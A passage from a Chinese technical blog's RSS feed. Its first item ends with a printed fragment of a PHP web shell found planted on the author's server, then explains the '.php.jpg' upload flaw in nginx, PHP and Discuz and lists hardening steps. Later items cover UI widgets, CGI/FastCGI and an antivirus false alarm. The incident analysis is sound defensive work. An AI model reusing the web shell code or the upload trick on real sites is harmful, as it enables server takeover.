<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'name'</span>] &amp;&amp; $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'name'</span>] = <span style="color: #70c0b1;">'form1'</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" metho</span><span style="color: #70c0b1; text-decoration: underline;">d=\"$arg[method]\" $arg[target]&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'title'</span>]) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;'</span>.$<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'title'</span>].<span style="color: #70c0b1;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #424242;"> </span>   }
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">maketext</span>($<span style="color: #e7c547;">arg</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>)){
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'cols'</span>] &amp;&amp; $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'cols'</span>] = <span style="color: #eaeaea; background-color: #000000;">100</span>;
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'rows'</span>] &amp;&amp; $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'rows'</span>] = <span style="color: #eaeaea; background-color: #000000;">25</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'title'</span>] = $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'title'</span>] ? $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'title'</span>].<span style="color: #70c0b1;">'&lt;br /&gt;'</span> : <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;p&gt;$arg[title]&lt;textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name</span><span style="color: #70c0b1; text-decoration: underline;">]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">formfooter</span>($<span style="color: #e7c547;">name</span> = <span style="color: #70c0b1;">''</span>){
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">name</span> &amp;&amp; $<span style="color: #e7c547;">name</span> = <span style="color: #70c0b1;">'submit'</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;&lt;input class="bt" name="'</span>.$<span style="color: #e7c547;">name</span>.<span style="color: #70c0b1;">'" id="'</span>.$<span style="color: #e7c547;">name</span>.<span style="color: #70c0b1;">'" type="submit" value=</span><span style="color: #70c0b1; text-decoration: underline;">"Submit"&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/form&gt;'</span>);
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">goback</span>(){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">global</span> $<span style="color: #e7c547;">self</span>, $<span style="color: #e7c547;">nowpath</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;form action="'</span>.$<span style="color: #e7c547;">self</span>.<span style="color: #70c0b1;">'" method="post"&gt;&lt;input type="hidden" name="action"</span><span style="color: #70c0b1; text-decoration: underline;"> value="file" /&gt;&lt;input type="hidden" name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'" /&gt;&lt;p&gt;&lt;input class="bt" type="submit" value="Go back..."&gt;&lt;/p&gt;&lt;/form&gt;'</span><span style="text-decoration: underline;">);</span>
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">formfoot</span>(){
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/form&gt;'</span>);
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">encode_pass</span>($<span style="color: #e7c547;">pass</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">pass</span> = <span style="color: #eaeaea; background-color: #000000;">md5(</span><span style="color: #70c0b1;">'angel'</span>.$<span style="color: #e7c547;">pass</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">pass</span> = <span style="color: #eaeaea; background-color: #000000;">md5(</span>$<span style="color: #e7c547;">pass</span>.<span style="color: #70c0b1;">'angel'</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">pass</span> = <span style="color: #eaeaea; background-color: #000000;">md5(</span><span style="color: #70c0b1;">'angel'</span>.$<span style="color: #e7c547;">pass</span>.<span style="color: #70c0b1;">'angel'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">pass</span>;
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">pr</span>($<span style="color: #e7c547;">s</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> <span style="color: #70c0b1;">"&lt;pre&gt;"</span>.<span style="color: #eaeaea; background-color: #000000;">print_r(</span>$<span style="color: #e7c547;">s</span>).<span style="color: #70c0b1;">'&lt;/pre&gt;'</span>;
}

<span style="color: #c397d8;">?&gt;</span>
</pre>
</div>

<p>
上面的脚本被恶意用户完成对系统的远程控制。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">问题根源</h2>
<div class="outline-text-2" id="text-5">
<p>
这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，原来已经被恶意用户种下了这些后门。
</p>

<p>
这个漏洞简言之就是用户可以上传文件后缀为 <code>.php.jpg</code> 的文件，在外部访问时直接被当做 <code>php</code> 执行，罪魁祸首归结为以下三点：
</p>

<ul class="org-ul">
<li><code>php</code> 配置
</li>

<li><code>nginx</code> 配置
</li>

<li><code>discuz</code>

<p>
允许上传文件名指定后缀为 <code>.php.jpg</code>
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">加固措施</h2>
<div class="outline-text-2" id="text-6">
<ul class="org-ul">
<li>采用更严格的文件目录权限

<ul class="org-ul">
<li>列出属主不应该为 <code>nobody</code> 的目录：

<div class="org-src-container">

<pre class="src src-sh">find . -type d  | xargs ls -lad | grep nobody | grep -v <span style="color: #70c0b1;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的目录（路径名包启/data）外，其它所有文件及目录属主都改为非 <code>nobody</code> 用户。
</p>

<p>
需要注意的是 <code>source/plugin/</code> 下的所有目录需要为所有用户添加上可执行权限（特别是自已开发并上传解压的插件），否则访问插件时会出现以下错误提示：
</p>

<pre class="example">
         指定的插件模块文件(XXXXXXXXXX)不存在或存在语法错误，请检查是否已将插件完整上传
</pre>
</li>

<li>列出属主不应该为 <code>nobody</code> 的文件：

<div class="org-src-container">

<pre class="src src-sh">find . -type f  | xargs ls -la | grep nobody | grep -v <span style="color: #70c0b1;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的文件（路径名包启/data）外，其它所有文件属主都改为非 <code>nobody</code> 用户。
</p>
</li>

<li>列出 <code>nobody</code> 可写的文件

<div class="org-src-container">

<pre class="src src-sh">find . -type f ! -perm 0644  | xargs ls -la | grep -v <span style="color: #70c0b1;">'/data/'</span>
</pre>
</div>

<p>
收回非必要的写权限。
</p>
</li>
</ul>
</li>

<li>确保上传目录中的 <code>php</code> 文件不会被当做 <code>php</code> 执行

<ul class="org-ul">
<li>data/attachment
</li>
<li>uc_server/data/avatar
</li>
<li>uc_server/data/tmp
</li>
</ul>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[网页中的自动完成的下拉列表框]]></title>
            <link>/article/7f5198754e2d768481ea52a85b8c621076844e0b62c9521788686846.html</link>
            <guid>/article/7f5198754e2d768481ea52a85b8c621076844e0b62c9521788686846.html</guid>
            <pubDate>Sun, 10 Mar 2013 13:23:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">jqueryui的<a href="http://jqueryui.com/autocomplete/#combobox">组件</a></h2>
<div class="outline-text-2" id="text-1">
<p>
示例效果看起来挻好，不过发现几个问题：
</p>

<ul class="org-ul">
<li>和<a href="http://twitter.github.com/bootstrap/">bootstrap</a>有冲突，导致右边的下拉箭头部分都看不见。
</li>
<li>操作过程中有时候显示的值和实际的值不一致，应该是中文输入法按键事件在firefox下未触发引起的显示的界面部分和隐藏的select输入框值不同步。
</li>
<li>没有提供设置当前选中项、禁用的功能，要自行对生成的界面元素进行处理。
</li>
</ul>

<p>
这个只是jqueryui自动完成输入框的一个定制示例，不是很完善，而jqueryui自带的正式版看起来只是一个输入框。
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2"><a href="https://github.com/harvesthq/chosen">chosen</a></h2>
<div class="outline-text-2" id="text-2">
<p>
非常完美，配置很简单，而且界面很漂亮，在github上评分很高。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Web模型初探]]></title>
            <link>/article/web-6a21578b521d63a2.html</link>
            <guid>/article/web-6a21578b521d63a2.html</guid>
            <pubDate>Thu, 28 Feb 2013 07:07:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">CGI</h2>
<div class="outline-text-2" id="text-1">
<p>
全称为Common Gateway Interface，即公共网关接口。
当Web服务器收到一个请求时，运行相应的处理程序，相关参数通过标准输入传递给处理程序，处理程序的标准输出做为响应内容，处理程序运行结束后将响应发送给客户端。
</p>

<ul class="org-ul">
<li>性能 *

<p>
进程级，每请求一进程。进程创建有很大的开销，并发数与系统资源消耗呈线性增长，有限的系统资源成为瓶颈。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">FastCGI</h2>
<div class="outline-text-2" id="text-2">
<p>
为CGI的改良，CGI程序做为独立的网络后台程序运行，当Web服务器收到一个请求时，发起一个tcp请求到处理程序，通过该tcp连接传入相关参数，处理程序的响应也通过该tcp连接发回给Web服务器，处理程序关闭该连接表示处理完毕，Web服务器最终将响应发送给客户端。
</p>

<ul class="org-ul">
<li>性能 **

<p>
网络级，每请求一连接。CGI的改良，重用进程，进程处理完一个请求后再处理下一请求，对于多个请求，只需要付出一次进程创建的开销，可以在后继请求重用资源（从文件载入的配置项、查询到的数据、打开的文件、数据库连接等）。因为处理程序是串行处理请求，往往需要同时运行多个处理程序以提升并发处理能力，这些处理程序无法共享资源以进一步提升性能。
</p>
</li>

<li>附录

<p>
Web服务器可重用到服务程序的连接进一步提升性能（如：nginx的<a href="http://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive">upstream_keepalive</a>）。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">WSGI</h2>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">uWSGI</h2>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[解决360杀毒报网页HTML.Rce.Gen3恶意程序的问题]]></title>
            <link>/article/89e351b3-360-67406bd262a57f519875-html.rce.gen3-6076610f7a0b5e8f768495ee9898.html</link>
            <guid>/article/89e351b3-360-67406bd262a57f519875-html.rce.gen3-6076610f7a0b5e8f768495ee9898.html</guid>
            <pubDate>Wed, 01 Aug 2012 00:55:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">问题描述</h2>
<div class="outline-text-2" id="text-1">
<p>
测试发现在某些机器上会弹出360杀毒危险警告对话框，导致网页无法打开。
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">解决方法</h2>
<div class="outline-text-2" id="text-2">
<p>
将嵌入的统计js脚本从&lt;/html&gt;标签后移到里面去。
</p>
<ul class="org-ul">
<li>修改前
</li>
</ul>
<div class="org-src-container">

<pre class="src src-html">...
&lt;/<span style="color: #e78c45;">body</span>&gt;
&lt;/<span style="color: #e78c45;">html</span>&gt;
&lt;<span style="color: #e78c45;">script</span> <span style="color: #e7c547;">type</span>=<span style="color: #70c0b1;">"text/javascript"</span>&gt;document.write(unescape(<span style="color: #70c0b1;">"%3Cscript%20...%3C/script%3E"</span>));&lt;/<span style="color: #e78c45;">script</span>&gt;
</pre>
</div>
<ul class="org-ul">
<li>修改后
</li>
</ul>
<div class="org-src-container">

<pre class="src src-html">...
&lt;<span style="color: #e78c45;">script</span> <span style="color: #e7c547;">type</span>=<span style="color: #70c0b1;">"text/javascript"</span>&gt;document.write(unescape(<span style="color: #70c0b1;">"%3Cscript%20...%3C/script%3E"</span>));&lt;/<span style="color: #e78c45;">script</span>&gt;
&lt;/<span style="color: #e78c45;">body</span>&gt;
&lt;/<span style="color: #e78c45;">html</span>&gt;
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">心得</h2>
<div class="outline-text-2" id="text-3">
<p>
以后再遇到这种情况，可以采取排除法，将网页另存为本地文件，一点点的删除内容直到360杀毒不再报警为止。</p>
</div>
</div>
]]></content:encoded>
        </item>
    </channel>
</rss>